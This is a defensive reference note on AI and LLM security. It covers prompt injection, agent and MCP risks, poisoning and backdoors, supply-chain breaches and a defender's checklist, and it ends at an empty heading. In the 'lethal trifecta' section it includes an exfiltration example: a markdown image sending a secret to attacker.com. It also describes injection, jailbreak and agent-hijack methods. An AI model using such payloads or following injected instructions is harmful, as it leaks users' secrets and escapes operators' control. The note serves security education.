# AI Security

> Security of and around AI/ML systems. Companion to [genai.md](genai.md), [genai-architecture.md](genai-architecture.md), [opensource-vulnerability.md](opensource-vulnerability.md).

## Contents

- [The three layers](#the-three-layers)
- [Canonical frameworks (the index of the field)](#canonical-frameworks-the-index-of-the-field)
- [AI risk & threats (two buckets)](#ai-risk--threats-two-buckets)
- [Prompt injection (the one that matters most)](#prompt-injection-the-one-that-matters-most)
  - [The Lethal Trifecta (Willison, 2025)](#the-lethal-trifecta-willison-2025)
  - [Defenses](#defenses)
- [Adversarial ML (layer 1)](#adversarial-ml-layer-1)
- [Supply chain (closest to classic AppSec)](#supply-chain-closest-to-classic-appsec)
- [Agentic & MCP (the 2026 frontier)](#agentic--mcp-the-2026-frontier)
- [Securing an AI system (the defender's playbook)](#securing-an-ai-system-the-defenders-playbook)
  - [The control that matters most: constrain capability, not input](#the-control-that-matters-most-constrain-capability-not-input)
  - [Secure the plumbing (where the real breaches happened)](#secure-the-plumbing-where-the-real-breaches-happened)
  - [Identity is the control plane](#identity-is-the-control-plane)
  - [Safety/quality controls (for the inherent risks, not attackers)](#safetyquality-controls-for-the-inherent-risks-not-attackers)
  - [Defense-in-depth (necessary, never sufficient)](#defense-in-depth-necessary-never-sufficient)
  - [A shippable checklist](#a-shippable-checklist)
- [Tooling](#tooling)
- [Industry trends (researched August 2026)](#industry-trends-researched-august-2026)
  - [1. Prompt injection reclassified: "bug" -> architectural constraint](#1-prompt-injection-reclassified-from-bug-to-permanent-architectural-constraint)
  - [2. Agentic AI is the attack surface now](#2-agentic-ai-is-the-attack-surface-now)
  - [3. OpenClaw - the self-hosted-agent era](#3-openclaw---the-everyone-self-hosts-an-agent-with-shell-access-era)
  - [4. Supply chain is where the actual breaches happened](#4-supply-chain-is-where-the-actual-breaches-happened)
  - [5. Offensive AI crossed the autonomy threshold](#5-offensive-ai-crossed-the-autonomy-threshold)
  - [6. Identity is becoming the control plane (NHI / agent identity)](#6-identity-is-becoming-the-control-plane-nhi--agent-identity)
  - [7. MCP grew up (security-wise)](#7-mcp-grew-up-security-wise)
  - [8. Regulation & incident-reporting clocks](#8-regulation--incident-reporting-clocks)
  - [9. The measurement gap](#9-the-measurement-gap)
  - [10. Coding agents became a first-class attack surface](#10-coding-agents-became-a-first-class-attack-surface)
  - [11. Governments published agent-specific guidance](#11-governments-published-agent-specific-guidance)
  - [12. An evaluation produced real-world unsanctioned actions (UK AISI)](#12-an-evaluation-produced-real-world-unsanctioned-actions-uk-aisi-july-2026)
  - [13. The industry moved to a collective-defence framing](#13-the-industry-moved-to-a-collective-defence-framing)
  - [Takeaway for a backend/AppSec engineer](#takeaway-for-a-backendappsec-engineer)
- [Resources](#resources)
- [TODO / next deep dives](#todo--next-deep-dives)

## The three layers

- "AI security" is really 3 separate disciplines merged by marketing
  - **Adversarial ML** - attacks the model as a mathematical object
    - evasion, poisoning, model extraction, membership inference
    - needs ML math; classic AppSec skills do NOT transfer
  - **LLM application security** - attacks the system built *around* the model
    - prompt injection, improper output handling, excessive agency
    - AppSec skills transfer almost fully
  - **AI infrastructure / supply chain** - attacks the pipeline, weights, serving stack
    - malicious model files, vulnerable inference servers, tenant escape
    - AppSec skills transfer fully
- most real, exploited-in-the-wild incidents so far = layers 2 and 3, not exotic layer-1 math

## Canonical frameworks (the index of the field)

- [MITRE ATLAS](https://atlas.mitre.org)
  - ATT&CK-style matrix of tactics/techniques against AI systems + real-world case studies
  - the threat-model backbone. start here
- [OWASP Top 10 for LLM Applications](https://genai.owasp.org) (OWASP GenAI Security Project)
  - LLM01 Prompt Injection
  - LLM02 Sensitive Information Disclosure
  - LLM03 Supply Chain
  - LLM04 Data & Model Poisoning
  - LLM05 Improper Output Handling
  - LLM06 Excessive Agency
  - LLM07 System Prompt Leakage
  - LLM08 Vector & Embedding Weaknesses
  - LLM09 Misinformation
  - LLM10 Unbounded Consumption
  - NOTE: separate OWASP **Machine Learning** Top 10 exists for classical ML
- [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) - ASI01-ASI10, first released Dec 2025
  - the agentic counterpart to the LLM Top 10. use this one once the system plans, calls tools, and acts over several steps
  - ASI01 **Agent Goal Hijack** - the objective is redirected by content the agent reads, not by code it runs
  - ASI02 **Tool Misuse & Exploitation** - legitimate tools bent to illegitimate ends via deceptive input or unsafe chaining
  - ASI03 **Identity & Privilege Abuse** - broad, long-lived agent credentials become the payload once the agent is hijacked
  - ASI04 **Agentic Supply Chain Vulnerabilities** - frameworks, MCP servers and tools that change after deployment, with no provenance
  - ASI05 **Unexpected Code Execution** - natural language reaching a shell or an `eval`-style API outside the intended boundary
  - ASI06 **Memory & Context Poisoning** - false content planted in persistent memory steers behaviour in later, unrelated sessions
  - ASI07 **Insecure Inter-Agent Communication** - unauthenticated, unencrypted agent-to-agent channels, open to spoofing
  - ASI08 **Cascading Failures** - one agent's bad output propagates through workflows that trust it
  - ASI09 **Human-Agent Trust Exploitation** - the agent shapes what reaches a human approver, so the approval is uninformed
  - ASI10 **Rogue Agents** - agents operating outside policy while looking legitimate, persisting across sessions
  - note how much of this is ordinary distributed-systems and IAM work. ASI01 is prompt injection; ASI03, ASI04 and ASI07
    are identity, supply chain and transport security under new names
- **NIST AI 100-2** - *Adversarial Machine Learning: A Taxonomy and Terminology of Attacks and Mitigations* (Vassilev et al.)
  - most rigorous free taxonomy. dense. cited by academics + regulators
- **NIST AI 100-1** - AI Risk Management Framework (AI RMF) - governance side
- [Google SAIF](https://saif.google) - vendor framework, good "secure the pipeline" mental model
- governance/compliance: EU AI Act, ISO/IEC 42001

## AI risk & threats (two buckets)

> Useful orthogonal framing to "the three layers". The three layers ask *what part of the stack*
> is attacked; this asks *does the harm come from an attacker or from the model itself*.

- **External threats** - an adversary is driving the harm
  - **prompt injection** - instructions smuggled via untrusted content -> see [Prompt injection](#prompt-injection-the-one-that-matters-most)
  - **data poisoning** - corrupt the training/fine-tune/RAG data -> see LLM04, [poisoning & backdoors](#adversarial-ml-layer-1)
  - **adversarial attacks** - perturbed inputs that flip model output (evasion) -> see [adversarial ML](#adversarial-ml-layer-1)
  - **multi-modal attacks** - the payload rides a non-text channel the text filters never see
    - instructions hidden in an image (pixels, alt text, EXIF), audio, or a document the model OCRs
    - a vision model reads text baked into an image; a guardrail scanning the *prompt string* misses it
    - expands the injection surface: every modality the model accepts is a new untrusted input
  - **MCP- & RAG-based attacks** - poison what the agent *retrieves* or the *tools* it's given
    - RAG: attacker plants content in the knowledge base / vector store -> retrieved as trusted context (LLM08)
    - MCP: malicious tool metadata, rug-pull servers, token mis-redemption -> see [Agentic & MCP](#agentic--mcp-the-2026-frontier)
- **Inherent risks** - failure modes of the model itself, no attacker required
  - **hallucination** - fluent, confident, wrong output (LLM09 Misinformation). the model has no ground-truth check
  - **misalignment** - model optimizes for something other than the operator's/user's actual intent
    - e.g. reward-hacking, sycophancy, taking an unintended shortcut to satisfy the literal instruction
    - the Replit "deleted the prod DB despite being told to change nothing" incident is this, not an attack
  - **bias** - skewed/unfair outputs inherited from training data or objective
- **why the split matters for defense**
  - external threats -> security controls (least privilege, input isolation, architecture)
  - inherent risks -> safety/quality controls (evals, grounding/RAG, human oversight, guardrails)
  - they *converge*: the permission model that lets a hallucinating agent delete data is the same one
    an attacker exploits via injection. secure design + safe design are the same design

## Prompt injection (the one that matters most)

- **core insight**: an LLM has no reliable channel separation between *instructions* and *data*
  - system prompt, user message, fetched web page, parsed PDF, tool output -> all one flat token stream
  - there is no `PreparedStatement` for LLMs
    - SQLi was solvable because SQL has a grammar you can parameterize against
    - natural language does not
- term coined by Simon Willison, Sept 2022 - [post](https://simonwillison.net/2022/Sep/12/prompt-injection/), after a Riley Goodside demo
- **direct injection** - user types adversarial text into the chatbot
  - *jailbreaking* = subtype where the target is the model's safety training
- **indirect injection** - the dangerous one
  - attacker instructions planted in content the model ingests *later*
  - web page, email, code comment, Jira ticket, image alt text, tool description
  - foundational paper: Greshake et al., *Not what you've signed up for* - [arXiv 2302.12173](https://arxiv.org/abs/2302.12173)

### The Lethal Trifecta (Willison, 2025)

- an agent becomes **exploitable** when it has all three:
  1. access to **private data** (files, email, DB)
  2. exposure to **untrusted content** (anything an attacker can influence)
  3. ability to **communicate externally** (web request, email, remote image, write to shared repo)
- any two = survivable. all three = attacker reads your secrets and posts them out
- exfil channels are broader than people expect
  - markdown image `![](https://attacker.com/?d=SECRET)` rendered in chat UI = a full GET request
  - **EchoLeak** (CVE-2025-32711) - zero-click exfil from MS 365 Copilot; a crafted email was enough

### Defenses

- **hard truth: no reliable fix exists**
  - detection guardrails (classifiers/filters) are probabilistic
  - against an adaptive attacker, a 99%-effective filter is a 0%-effective filter - they just retry
- what actually works = **architectural** defenses that break the trifecta
  - **dual-LLM / privileged-quarantined split** (Willison)
    - privileged LLM never sees untrusted content; orchestrates a quarantined LLM that does but has no tools
  - **CaMeL** - Google DeepMind, *Defeating Prompt Injections by Design* - [arXiv 2503.18813](https://arxiv.org/abs/2503.18813)
    - extract control flow from the *trusted* user query, enforce data-flow/capability policy on it
    - most promising direction: a security-engineering answer, not an ML answer
  - **Spotlighting** - Microsoft - [arXiv 2403.14720](https://arxiv.org/abs/2403.14720)
    - delimit/encode untrusted spans. raises cost, doesn't eliminate
  - **least privilege on tools** + **human-in-the-loop on irreversible actions**
    -> detailed in [the control that matters most](#the-control-that-matters-most-constrain-capability-not-input)
- design rule: assume the model **will** be injected; make it not matter
- treat every LLM output as untrusted user input
  - if it flows into shell / SQL / `eval` / browser DOM -> that's LLM05, i.e. classic injection wearing a hat

## Adversarial ML (layer 1)

- **evasion / adversarial examples**
  - imperceptible perturbation flips a classifier
  - Goodfellow, Shlens, Szegedy - *Explaining and Harnessing Adversarial Examples* - [arXiv 1412.6572](https://arxiv.org/abs/1412.6572)
  - defense baseline: Madry et al., PGD adversarial training - [arXiv 1706.06083](https://arxiv.org/abs/1706.06083)
  - LLM equivalent: **GCG** - Zou et al., *Universal and Transferable Adversarial Attacks on Aligned LLMs* - [arXiv 2307.15043](https://arxiv.org/abs/2307.15043)
    - gradient-optimized nonsense suffixes that transfer across models
- **why jailbreaks work**: Wei, Haghtalab, Steinhardt - *Jailbroken: How Does LLM Safety Training Fail?* - [arXiv 2307.02483](https://arxiv.org/abs/2307.02483)
  - *competing objectives* - helpfulness vs harmlessness
  - *mismatched generalization* - safety training didn't cover the capability's full input space (base64, low-resource languages)
- **poisoning & backdoors**
  - Gu et al., *BadNets* - [arXiv 1708.06733](https://arxiv.org/abs/1708.06733) - the origin
  - Carlini et al., *Poisoning Web-Scale Training Datasets is Practical* - [arXiv 2302.10149](https://arxiv.org/abs/2302.10149)
  - Anthropic/UK AISI (2025): a near-**constant** number of poisoned docs (~250) implants a backdoor *regardless of model size*
    - => poisoning does NOT get harder as models scale. overturned the prior assumption
- **privacy: extraction & inference**
  - Carlini et al., *Extracting Training Data from LLMs* (USENIX Sec 2021) - [arXiv 2012.07805](https://arxiv.org/abs/2012.07805)
    - verbatim memorized PII pulled out of GPT-2
  - Shokri et al., *membership inference* (IEEE S&P 2017) - [arXiv 1610.05820](https://arxiv.org/abs/1610.05820)
    - "was this record in the training set?" -> a GDPR problem, not just academic
  - RAG/vector stores leak (LLM08)
    - embeddings are invertible enough to be a disclosure channel
    - multi-tenant vector DB with bad filtering = straightforward IDOR

## Supply chain (closest to classic AppSec)

- **model file formats**
  - Python `pickle` (`.bin`, `.ckpt`) executes arbitrary code on load - `torch.load` is `eval()` with extra steps
  - => prefer **`safetensors`** always
  - malicious models found repeatedly on Hugging Face
  - scan with **ModelScan** (Protect AI) / `picklescan`
- **serving stack**
  - **ShadowRay** (Oligo, 2024) - internet-exposed Ray clusters, disputed+unpatched RCE, actively exploited to mine crypto on GPU fleets
  - Wiz research: tenant-isolation escapes in AI-as-a-service providers
- normal CVE/dependency hygiene applies -> see [opensource-vulnerability.md](opensource-vulnerability.md), [containers.md](containers.md), [kubernetes.md](kubernetes.md)

## Agentic & MCP (the 2026 frontier)

- tool descriptions are part of the prompt
  - => malicious MCP server can poison the agent via **tool metadata**
  - **rug pull**: server swaps its tool definition after the user approved it
- untrusted tool output + broad agent permissions = **Excessive Agency (LLM06)** with a remote trigger
- best practical research here: Johann Rehberger (Embrace The Red)

## Securing an AI system (the defender's playbook)

> The rest of this note is organized by *attack*. This section is the inverse: if you're the one
> shipping the system, what do you actually do. It cross-links rather than repeats — the attacks it
> defends against are detailed above.

- **the one mental model**: *secure design and safe design are the same design*
  - the permission model that lets a hallucinating agent delete data is the one an attacker exploits
    via injection -> see [two buckets](#ai-risk--threats-two-buckets)
  - => you are not "adding security", you are constraining what the agent is *allowed to do*
- **assume the model will be injected; make it not matter**
  - detection/guardrails are probabilistic; an adaptive attacker turns a 99% filter into a 0% one
    -> see [Defenses](#defenses)
  - design so that a fully-compromised model still can't cause the harm you care about
  - corollary: **treat every model output as untrusted user input** (LLM05) -> see [Defenses](#defenses)

### The control that matters most: constrain capability, not input

- **break the lethal trifecta** (private data + untrusted input + external comms)
  -> see [Lethal Trifecta](#the-lethal-trifecta-willison-2025)
- operationalize it with **Meta's "Agents Rule of Two"** (Nov 2025) - [ai.meta.com](https://ai.meta.com/blog/practical-ai-agent-security/)
  - an agent may satisfy at most **2 of 3** in a session:
    - [A] processes untrustworthy input
    - [B] accesses sensitive systems / private data
    - [C] changes state or communicates externally
  - need all 3? -> mandatory human-in-the-loop. inspired by Chromium's rule of 2 + Willison's lethal trifecta
  - **the trifecta turned into a shippable engineering budget** - spent per session, decided at
    design time, not a filter you bolt on
- **least privilege on tools** + **human-in-the-loop on irreversible/high-blast-radius actions**
  - unglamorous; the thing that actually saves you
  - scope tools narrowly, prefer read-only, gate writes/sends/deletes behind confirmation
- **architectural injection containment** when the app needs more than a permission cut:
  - dual-LLM / privileged-quarantined split; **CaMeL** (capability + data-flow policy from the
    *trusted* query); **Spotlighting** (delimit/encode untrusted spans) -> see [Defenses](#defenses)

### Secure the plumbing (where the real breaches happened)

- this is layer 3 and it's where 2026 incidents actually landed -> see [trend #4](#4-supply-chain-is-where-the-actual-breaches-happened)
- **model artifacts**: prefer `safetensors`; never `pickle`-load untrusted weights; scan with
  ModelScan / `picklescan` -> see [Supply chain](#supply-chain-closest-to-classic-appsec)
- **dependencies & CI/CD**: the LiteLLM compromise was a poisoned CI action, not a model attack ->
  normal SCA/dependency hygiene applies, see [opensource-vulnerability.md](opensource-vulnerability.md)
- **serving stack**: patch/isolate inference servers (Ray, Flowise); enforce tenant isolation
- **MCP**: require OAuth 2.1 + PKCE, scoped tokens, RFC 8707 resource indicators, RFC 9207 issuer
  validation; pin tool definitions to defeat rug-pulls -> see [trend #7](#7-mcp-grew-up-security-wise)
- **egress**: default-deny outbound from anything an agent executes in, then allowlist. this is the control
  that would have contained the [AISI incident](#12-an-evaluation-produced-real-world-unsanctioned-actions-uk-aisi-july-2026),
  and it is the one that breaks the third leg of the trifecta at the infrastructure layer rather than in the prompt
- **the developer environment is production**: repo-supplied agent config (`CLAUDE.md`, `.cursorrules`,
  `.mcp.json`, hooks, skills) executes on your machine with your credentials
  -> see [trend #10](#10-coding-agents-became-a-first-class-attack-surface)

### Identity is the control plane

- the agent *is* a privileged non-human identity -> classic IAM at new scale
  -> see [trend #6](#6-identity-is-becoming-the-control-plane-nhi--agent-identity)
- scoped, short-lived, per-agent credentials; no shared/over-broad service accounts
- audit + revoke agent identities like any privileged principal; watch for shadow-AI NHIs
- leans directly on [authentication-authorization.md](authentication-authorization.md), [oauth.md](oauth.md)

### Safety/quality controls (for the *inherent* risks, not attackers)

- hallucination/misalignment/bias aren't attacks but still cause harm -> see [inherent risks](#ai-risk--threats-two-buckets)
- grounding/RAG with provenance, evals in CI, human oversight on consequential outputs
- these converge with the security controls: same permission model, same HITL gates

### Defense-in-depth (necessary, never sufficient)

- guardrails/classifiers (Llama Guard, NeMo, Rebuff), input/output filtering, rate limits for
  [Unbounded Consumption](#canonical-frameworks-the-index-of-the-field) (LLM10)
- **explicitly the last layer, not the control** -> see [trend #1](#1-prompt-injection-reclassified-from-bug-to-permanent-architectural-constraint)
- logging/monitoring: most AI incidents get **no CVE** and aren't caught by scanners
  -> see [the measurement gap](#9-the-measurement-gap); assume detection tooling under-counts

### A shippable checklist

- [ ] threat-model against [MITRE ATLAS](https://atlas.mitre.org) + OWASP LLM/Agentic Top 10 *before* building
- [ ] compute the Rule-of-Two budget per agent/session; document which 2 of 3 it holds
- [ ] enumerate every tool -> least privilege, read-only default, HITL gate on irreversible actions
- [ ] map trust boundaries: what content is untrusted (RAG, web, email, tool output, images/multi-modal)
- [ ] artifacts = `safetensors` only + scanned; deps in SCA; CI/CD locked down
- [ ] each agent has a scoped, short-lived, revocable identity
- [ ] guardrails + logging as defense-in-depth, wired to actually-monitored alerts
- [ ] treat all model output as untrusted before it hits any sink
- [ ] **default-deny egress** from anything the agent runs in; allowlist the hosts it actually needs
- [ ] state the scope in the prompt *and* enforce it in the network - the prompt alone is not a boundary
- [ ] monitor agent actions **while the run is in progress**, not only by reviewing transcripts afterwards
- [ ] review the repo's agent config (`CLAUDE.md`, `.cursorrules`, `.mcp.json`, hooks, skills) before opening
      an untrusted project in a coding agent -> [trend #10](#10-coding-agents-became-a-first-class-attack-surface)
- [ ] separate the agent's **workload identity** from the **user authority** it acts under; do not conflate them

## Tooling

- red teaming / scanning
  - **PyRIT** (Microsoft) - Python Risk Identification Toolkit
  - **garak** (NVIDIA) - LLM vulnerability scanner
  - **promptfoo** - eval + red-team in CI
  - **Giskard** - LLM testing
  - **ART** (Adversarial Robustness Toolbox, IBM/LF AI) - classical ML attacks/defenses
  - **Counterfit** (Microsoft) - ML attack automation
- guardrails (probabilistic - defense in depth, never the only control)
  - **Llama Guard** (Meta) - [arXiv 2312.06674](https://arxiv.org/abs/2312.06674)
  - **NeMo Guardrails** (NVIDIA)
  - Rebuff
- supply chain: **ModelScan**, `picklescan`, `safetensors`
- bug bounty: **huntr** (AI/ML bug bounty)

## Industry trends (researched August 2026)

> Sourcing note: AI-security "trends" content is heavily SEO-farmed. Everything below is from primary
> sources (OWASP, NIST/CISA/NSA, UK AISI, Anthropic, MCP spec, vendor incident writeups) or corroborated
> by 2+ credible outlets. Market-size, survey and percentage stats are **vendor-sourced** - treat as
> directional, not gospel. Trends 1-9 were written July 2026; 10-13 and the updates within 4-8 are August 2026.

### 1. Prompt injection reclassified: from "bug" to "permanent architectural constraint"

- the industry stopped promising a fix and pivoted to **containment**
- OWASP: prompt injection maps to **6 of the 10** categories in the new Top 10 for **Agentic** Applications
  - [Help Net Security, 2026-06-11](https://www.helpnetsecurity.com/2026/06/11/owasp-prompt-injection-ai-security-failures/)
  - root cause restated officially: system prompt + user request + retrieved text = one undifferentiated token stream
- **Meta's "Agents Rule of Two"** (Nov 2025) is now the de-facto design rule
  -> definition in [the control that matters most](#the-control-that-matters-most-constrain-capability-not-input)
- => guardrails/classifiers demoted to defense-in-depth; architecture is the control

### 2. Agentic AI is *the* attack surface now

- OWASP shipped **Top 10 for Agentic Applications** (Dec 2025) - separate from the LLM Top 10
  -> the ASI01-ASI10 list is in [Canonical frameworks](#canonical-frameworks-the-index-of-the-field)
- OWASP *State of Agentic AI Security and Governance v2.01* now catalogs **real CVEs and breach reports**
  - the 2025 edition catalogued only *plausible* threats. that's the shift: theory -> incidents
- advisory volume by project (OWASP tracking 53 agentic projects, 28 of them coding agents):
  - n8n (57), Claude Code (22), AutoGPT (15), Dify (13), Roo-Code (11)
  - 7 projects ship updates daily-or-faster -> security triage can't keep pace
- only **37%** of orgs have any policy to detect shadow AI usage

### 3. OpenClaw - the "everyone self-hosts an agent with shell access" era

- **OpenClaw** (formerly ClawdBot/MoltBot): viral open-source self-hosted autonomous agent
  - shell exec, file r/w, browsing, email, calendar, persistent cross-session memory
- went viral early 2026; the security fallout is the case study of the year
  - **255+ GitHub Security Advisories** - command exec, plaintext API keys/credentials
  - **ClawHavoc** - supply-chain campaign, **1,100+ malicious "skills"** uploaded to ClawHub
    (masquerading as productivity/crypto/coding tools)
  - **tens of thousands of internet-exposed instances** - default bind to 0.0.0.0 instead of localhost
  - listed in OWASP's Q1 2026 exploit round-up for ignoring stop commands and deleting a user's inbox
- lesson: the trifecta isn't hypothetical when users voluntarily hand an LLM their whole machine

### 4. Supply chain is where the actual breaches happened

- **LiteLLM compromise (24 Mar 2026)** - the defining AI supply-chain incident so far
  - actor "**TeamPCP**" poisoned a **Trivy GitHub Action** in LiteLLM's CI/CD -> stole PyPI credentials
    -> published backdoored `litellm==1.82.7` / `1.82.8` directly to PyPI, bypassing CI
  - payload: malicious **`.pth` file** (`litellm_init.pth`) = auto-exec on *every Python process start*
    - 3-stage: credential harvester (50+ secret categories) + **Kubernetes lateral-movement toolkit** + persistent RCE backdoor
  - blast radius: LiteLLM is the LLM gateway for CrewAI, DSPy, Microsoft GraphRAG etc. ~95M downloads/month
  - live ~40 min before PyPI quarantine (~3h total); **~47,000 downloads** in the window
  - found **by accident** by a researcher, not by security tooling. that's the real finding
  - sources: [LiteLLM advisory](https://docs.litellm.ai/blog/security-update-march-2026),
    [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/),
    [Snyk](https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/),
    [Trend Micro](https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html)
- `postmark-mcp` - malicious MCP server: shipped 15 clean versions, then quietly added one line of exfil
- **Flowise CVE-2025-59528** - RCE, actively exploited, 12k-15k instances online
- pattern: attackers hit the **AI plumbing** (gateways, MCP servers, orchestrators), not the models
- volume, first half of 2026 (Phoenix Security tracking): 37 malicious-package campaigns, 497 indexed
  malicious packages - roughly 2.6x the campaign volume and 4.5x the package volume of all of 2025
  - [Phoenix Security](https://phoenix.security/accelerating-supply-chain-attacks-npm-pypi-vsx-ai-enabled-2026/)
- the new delivery vector is **the coding agent's own configuration**: `.cursorrules` poisoning, hidden
  instructions in `CLAUDE.md`, project-level skills, SessionStart hooks, and project-declared MCP servers
  - confirmed in at least 14 of 59 tracked campaigns - no longer a theoretical vector
- `jscrambler` (11 Jul 2026) - stolen publishing credentials used to push five malicious npm versions plus
  poisoned webpack/gulp/grunt/metro plugins. same shape as LiteLLM: credentials, not code, were the way in

### 5. Offensive AI crossed the autonomy threshold

- **GTG-1002** - [Anthropic, Nov 2025](https://www.anthropic.com/news/disrupting-AI-espionage)
  - China state-sponsored espionage campaign using **Claude Code in an agentic loop**, ~30 targets
  - AI performed **~80-90% of tactical operations**: recon, vuln research, credential handling,
    lateral movement, data analysis
  - first publicly-known AI *autonomously* running multi-step attacks on well-defended targets
- **May 2026** - first fully autonomous LLM-driven post-exploitation documented in the wild
  - harvested cloud creds, pulled an SSH key from AWS Secrets Manager, exfiltrated a PostgreSQL DB - **in under 1 hour**
- Mexican government breach (Q1 2026) - ~150 GB tax/voter data via Claude-assisted attack automation
- OWASP's framing: **"AI is now a force multiplier for cyberattacks"** - the attacker economics changed,
  not (yet) the attacker capabilities
- Anthropic mapped **832 accounts banned for malicious cyber activity** (Mar 2025 - Mar 2026) onto MITRE ATT&CK
  - [writeup](https://www.anthropic.com/news/AI-enabled-cyber-threats-mitre-attack); some results fed Verizon's 2026 DBIR
  - 67.3% used AI for malware development; 6.5% for lateral movement - the harder, later stages are still the minority
  - actors rated medium-risk or higher went from 33% in the first six months to 56% in the second
  - their conclusion: ATT&CK does not capture the thing that makes these actors dangerous, which is
    **autonomous orchestration** of chained stages rather than any single new technique
  - the useful reading: the differentiator between a low- and high-capability actor is no longer skill, it is orchestration

### 6. Identity is becoming the control plane (NHI / agent identity)

- the agent *is* a privileged non-human identity -> classic IAM problem, new scale
- vendor stats (Tenable 2026 Cloud & AI Security Risk Report, CyberArk):
  - machine identities outnumber humans **~82:1** (some report 100:1)
  - **18%** of orgs have overprivileged AI identities; **52%** of NHIs hold critical excessive permissions
- new product category: **AI-SPM** (AI Security Posture Management) - visibility into models,
  training data, inference pipelines, agents
- market: agentic AI security ~$1.65B (2026) -> ~$13.5B (2032), 42% CAGR. heavy vendor consolidation/acquisition
- the shape the standards are settling on is **two identity layers, not one**
  - **workload layer**: the agent process gets a SPIFFE ID and an SVID (X.509 or JWT) from SPIRE at start-up,
    so it authenticates without a stored secret. the IETF **AIMS** draft formalises treating agents as workloads
  - **delegation layer**: OAuth tokens represent the *user's* authorisation that the agent is acting under
  - conflating the two is the common mistake - "the agent's identity" and "whose authority it acts with" are
    different questions and need different credentials
- survey numbers, 2026 (vendor-sourced, directional): ~95% of organisations run agents that act autonomously,
  but only ~22% treat agents as distinct identities - most still share API keys. ~88% report a confirmed or
  suspected agent-related security incident in the past year
- Gartner puts 2026 information-security spend at $244.2B, up 13.3%, with IAM the fastest-moving line item
- => **this is where AppSec/IAM skills pay off directly.** see [authentication-authorization.md](authentication-authorization.md), [oauth.md](oauth.md)

### 7. MCP grew up (security-wise)

- 2026 spec revisions harden authorization to match real OAuth 2.0/OIDC deployment
  - **OAuth 2.1** flow, PKCE, scoped tokens, consent screens
  - **RFC 8707 resource indicators** mandated -> prevents token mis-redemption (a malicious MCP server
    reusing a token meant for another service)
  - **incremental scope consent** -> least privilege per operation
  - session hijacking fixes; no unsolicited server-initiated prompts
- the **2026-07-28 spec shipped** - [release notes](https://blog.modelcontextprotocol.io/posts/2026-07-28/)
  - MCP servers are now formally **OAuth 2.1 resource servers**
  - **RFC 9207 issuer validation**: the authorization server returns `iss`, and the client must check it before
    redeeming the code. this closes the authorization-server mix-up attack
  - client credentials are **bound to the issuer that minted them**; tokens carry an audience, so a server
    rejects a token minted for somewhere else
  - **Dynamic Client Registration deprecated** in favour of Client ID Metadata Documents (CIMD)
  - the protocol became **stateless** - every request self-describing, so requests can land on any instance.
    good for scaling, and it also means each request has to carry its own authorisation rather than inherit
    a session's
  - **Multi Round-Trip Requests** let a server ask the client for a confirmation without a bidirectional stream,
    which is the transport a human-in-the-loop gate needs
  - a formal deprecation policy (SEP-2596) with a 12-month minimum window - the protocol is being run as infrastructure now
- **NSA published an MCP security CSI** (June 2026) - "Security Design Considerations for AI-Driven Automation"

### 8. Regulation & incident-reporting clocks

- **EU AI Act**: the **Digital Omnibus on AI** entered into force **27 Jul 2026** (OJ publication 24 Jul 2026)
- what is actually live now: **Article 50 transparency obligations apply from 2 Aug 2026**, unamended by the Omnibus
  - disclose that a user is interacting with an AI system; mark synthetic content; label deepfakes;
    disclose emotion-recognition and biometric-categorisation use
  - Article 50(2) machine-readable marking of AI-generated content -> **2 Dec 2026**
- what moved: high-risk (Annex III) obligations **deferred to 2 Dec 2027**; Annex I embedded-product AI -> **2 Aug 2028**
  - reason: national competent authorities and harmonised standards weren't ready
  - the deferral is not relief from the transparency layer, which is the part most product teams touch
- incident-notification windows are tightening and now bind AI systems:
  - **DORA**: 4 hours | **NIS2**: 24-hour early warning | **California SB 53**: 15 days for frontier-model incidents

### 9. The measurement gap

- most AI security events get **no CVE** - they're misconfiguration, design flaws, supply-chain weaknesses,
  not discrete code bugs
- => traditional vuln management/SCA tooling structurally under-counts AI risk
- => and LiteLLM was caught by a human by accident, not by a scanner

### 10. Coding agents became a first-class attack surface

- the coding agent is the agent most engineers actually run, and it is where most disclosed agent CVEs landed in 2026
- **repository-controlled configuration is executable input**
  - **CVE-2025-59536** (CVSS 8.7, published Oct 2025; Check Point writeup Feb 2026) - a cloned repository could
    supply `.claude/settings.json` hooks that ran shell commands when the agent started, before the trust dialog
    - fixed in Claude Code 1.0.111+. disclosed with **CVE-2026-21852**
    - [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
  - **CVE-2026-35603** (Cymulate, disclosed 5 Jan 2026) - on Windows, `C:\ProgramData\ClaudeCode\managed-settings.json`
    was neither created nor permission-restricted by default, so any standard user could plant a session-start hook
    that ran in every other user's session. Cursor, Codex CLI and Gemini CLI had the same defect
  - Claude Code, Gemini CLI, Cursor CLI and Copilot CLI would each auto-start **project-declared MCP servers** once
    the folder-trust prompt was accepted, and all four defaulted to "yes"
- **injection arrives through ordinary collaboration surfaces**
  - Claude Code's security-review action, Gemini CLI Action and GitHub Copilot Agent were each shown acting on
    instructions in a crafted pull-request title or comment, reaching command execution and credential access
  - **CVE-2026-22708** (Cursor) - poison the agent's execution environment so an allowlisted command runs an attacker payload
- **sandbox bypasses** - two Claude Code network-sandbox bypasses, including **CVE-2025-66479** (outbound-blocking
  misconfiguration read as allow-all) and a SOCKS5 hostname null-byte issue affecting 2.0.24-2.1.89
- the working rule: `CLAUDE.md`, `.cursorrules`, `.mcp.json`, hooks and skills are **code contributed by whoever
  wrote the repository**. read them before opening an untrusted project, and give the agent only the credentials
  the task needs -> see [software-dev-with-gen-ai.md](software-dev-with-gen-ai.md)

### 11. Governments published agent-specific guidance

- **"Careful Adoption of Agentic AI Services"** (1 May 2026) - first joint Five Eyes guidance aimed specifically
  at autonomous agents. CISA with NSA, ASD ACSC, CCCS, NCSC-NZ and NCSC-UK
  - names five risk categories: privilege escalation, design and configuration flaws, behavioural misalignment,
    structural cascading failures, accountability opacity
- **NIST CAISI AI Agent Standards Initiative** (17 Feb 2026) - agent security, interoperability and identity
- **NIST COSAiS** - SP 800-53 control overlays for AI systems, two of which cover single-agent and multi-agent
  deployments. this is the document to reach for when agent controls have to map onto an existing compliance regime
- with the NSA MCP CSI (June 2026), agent security now has government-issued baselines you can cite in a design review
  rather than only vendor blog posts

### 12. An evaluation produced real-world unsanctioned actions (UK AISI, July 2026)

